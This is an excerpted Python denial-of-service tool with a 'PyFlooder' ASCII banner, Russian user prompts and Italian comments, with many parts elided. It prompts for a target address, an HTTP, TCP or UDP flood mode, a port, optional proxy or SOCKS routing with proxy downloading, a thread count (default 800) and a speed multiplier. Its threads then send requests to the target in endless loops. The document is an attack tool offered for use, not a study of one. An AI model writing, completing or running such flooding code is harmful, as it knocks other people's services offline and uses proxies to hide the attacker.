...
888    888          888        888                        888
888   d88P 888  888 8888888    888  .d88b.   .d88b.   .d88888  .d88b.  888d888
8888888P"  888  888 888        888 d88""88b d88""88b d88" 888 d8P  Y8b 888P"
888        888  888 888        888 888  888 888  888 888  888 88888888 888
888        Y88b 888 888        888 Y88..88P Y88..88P Y88b 888 Y8b.     888
888         "Y88888 888        888  "Y88P"   "Y88P"   "Y88888  "Y8888  888
                888
           Y8b d88P
            "Y88P"
                {Created by: c'o'mrade }
	''') # la grafica ci sta
...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	url = input("\nВведите айпи или адрес: ").strip()

	if url == "":
		print ("Пожалуйста, введите правильный адрес... ")
		starturl()
...
def floodmode(): # la scelta della modalitÃ  di attacco
	global choice1
	choice1 = input("HTTP '0', TCP '1' or UDP '2' ? ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
			if os.getuid() != 0: # se il programma NON e' stato eseguito come root:
				print("У вас нет рут прав. ") # printa questo
				exit(0) # e esce
			else: # altrimenti
				floodport() # continua
		except:
...
def floodport():
	global port
	try:
		port = int(input("Введите порт куда будет идти потоки: "))
		...
		print ("Неверное значение.") # printa questo e
		floodport() # riparte la funzione e ti fa riscrivere
	proxymode()

def proxymode():
	global choice2
	choice2 = input("Хотите прокси/сокс Отправьте 'y' чтоб включить: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("Введите '0' чтоб выбрать прокси, введите '1' чтоб выбрать сокс")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("Хотите скачать прокси? Введите 'y' чтоб сделать это: ")
	if choice4 == "y":
...
def proxylist():
	global proxies
	out_file = str(input("Иия прокси (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def numthreads():
	global threads
	try:
		threads = int(input("Количество потоков (800): "))
	except ValueError:
		threads = 800
		print ("800 потокоа выбрано.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("Выберите скорость атаки 1-5 слабая скорость 30-50 средняя скорость,100 или более мощная скорость: "))
	except ValueError:
...
def begin():
	choice6 = input("Нажмите 'Ентер' чтоб начать: ")
	if choice6 == "":
		loop()
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.send(p) # ed invia
				print ("Запрос отправлен из " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # print req + counter
		...
		while True:
			try:
				...
				try:
					...
					print ("Сокс упал. Загрузка .=>", self.counter)
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se qualcosa va storto
				...
				print ("Запрос отправлен =>", self.counter) # print richiesta + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("Запрос отправлен из " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try:
				...
				print ("Запрос отправлен " + str(proxy[0]+":"+proxy[1]) + " =>", self.counter) # print delle richieste
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
